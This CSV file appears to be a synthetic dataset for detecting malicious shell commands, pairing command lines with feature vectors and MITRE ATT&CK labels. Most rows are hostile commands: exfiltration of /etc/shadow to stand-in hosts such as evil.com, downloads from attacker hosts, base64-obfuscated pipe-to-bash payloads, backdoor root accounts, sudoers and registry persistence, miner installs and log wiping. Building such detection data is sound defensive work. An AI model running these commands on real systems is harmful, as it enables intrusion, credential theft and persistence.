command,features,label,source
powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
vim  /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
whoami /all | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time crontab -l,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'ZWNobyAnJyA+IC92YXIvbG9nL3N5c2xvZw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""crontab -e && history -c""","[0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty  -Path  'HKLM:\...'  -Name  Persist  -Value  'C:\payload.exe'  ;  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo ip route show,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo 'bHNjcHU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
net  user  /domain  &&  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'Y3JvbnRhYiAtZQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]",['T1496_Resource_Hijacking'],synthetic
echo  'Y2F0IC9ldGMvcmVzb2x2LmNvbmY='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
cat ~/.ssh/id_rsa ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbiAmJiBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
sudo certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIC1vIC90bXAvc2hlbGwuc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
last -n 10,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nmcli connection show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
time echo 'Z2V0ZW50IHBhc3N3ZCB8IGF3ayAtRjogJyQzID49IDEwMDAn' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1087_Account_Discovery'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
time cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
sudo sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo  'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""psexec.py Administrator:password@10.0.0.5 cmd.exe""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
nohup id -Gn &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
sudo echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe ; > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.52, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/shadow,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
su -s /bin/bash www-data | sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net user /add attacker P@ssw0rd | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
time New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/group && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""vim /etc/hosts""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cat /etc/os-release && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup shred -u /var/log/auth.log ; sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time route -n ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""python3 -c 'import socket,subprocess,os;...'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 0, 0]",['T1136_Create_Account'],synthetic
su -s /bin/bash www-data && > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""strings /proc/*/mem | grep -i password""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
"bash -c ""history -c && history -w""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1070_Indicator_Removal'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.64, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""su -s /bin/bash www-data""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
nohup medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh &,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1110_Brute_Force'],synthetic
lsb_release  -a  |  sleep  1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nbtscan 192.168.1.0/24 ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""lscpu""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
./pwnkit ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
cat /etc/resolv.conf | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup wget -q -O- --header='X-Auth: token123' http://evil.com/cmd &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'Y2F0IH4vLnNzaC9pZF9yc2EgOyBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""cat /etc/os-release""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
wmic  useraccount  list  &&  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow | echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLw==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y2F0IH4vLmF3cy9jcmVkZW50aWFscyA7ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgc3NoOi8vMTAuMC4wLjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
wget -q https://example.com/file.tar.gz,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
find / -perm -4000 -type f 2>/dev/null ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
passwd  -d  root  &&  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
cat /etc/resolv.conf,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
cat /etc/shadow,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
useradd -m -s /bin/bash hacker ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bmV0IHVzZXIgL2FkZCBhdHRhY2tlciBQQHNzdzByZCB8IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 0, 0]",['T1136_Create_Account'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
time medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh | > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.56, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
